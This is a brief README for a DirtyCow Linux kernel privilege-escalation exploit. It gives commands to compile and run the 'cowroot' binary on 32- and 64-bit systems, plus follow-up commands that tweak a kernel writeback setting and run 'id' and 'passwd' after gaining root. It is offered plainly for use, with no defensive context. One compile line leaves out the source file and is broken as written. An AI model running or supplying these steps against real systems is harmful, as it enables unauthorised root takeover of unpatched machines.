# DirtyCow
Dirtycow exploit for both 32 and 64-bit 

# Usage Example For 32 Bit

Compile -o = Output
* $ gcc dc32.c -o cowroot -pthread
OR
* $ gcc -o cowroot -pthread

Run
* $ ./cowroot
* $ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
* id
* passwd

# Usage Example For 64 Bit

* $ gcc dc64.c -o cowroot -pthread
* $ ./cowroot
* $ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
